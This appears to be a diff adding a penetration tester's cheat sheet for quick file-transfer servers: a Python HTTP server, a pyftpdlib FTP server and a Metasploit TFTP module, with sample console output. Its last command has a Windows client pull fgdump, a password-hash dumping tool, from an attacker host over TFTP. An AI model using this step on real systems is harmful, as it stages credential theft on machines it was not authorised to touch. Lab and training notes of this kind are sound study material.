@@ -1,0 +1,44 @@
+
+
+Simple Python servers:
+
+
+    == HTTP ==
+    
+-- python_http_server.py --
+
+import SimpleHTTPServer
+import SocketServer
+PORT = 8000
+Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+httpd = SocketServer.TCPServer(("", PORT), Handler)
+print "serving at port", PORT
+httpd.serve_forever()
+
+
+
+    == FTP ==
+apt-get install python-pyftpdlib 
+python -m pyftpdlib -p 21
+
+    == TFTP ==
+   
+msf > use auxiliary/server/tftp
+msf auxiliary(tftp) > set TFTPROOT /some/folder"
+TFTPROOT => /some/folder
+
+msf auxiliary(tftp) > run
+[*] Auxiliary module execution completed
+msf auxiliary(tftp) > 
+[*] Starting TFTP server on 0.0.0.0:69...
+[*] Files will be served from /some/folder
+[*] Uploaded files will be saved in /tmp
+msf auxiliary(tftp) > 
+
+From the Windows client:
+TFTP.EXE -i 10.11.0.159 get fgdump.exe C:\Users\Public
+
+#TFTP manual
+https://technet.microsoft.com/en-us/library/ff698993(v=ws.11).aspx
+
+
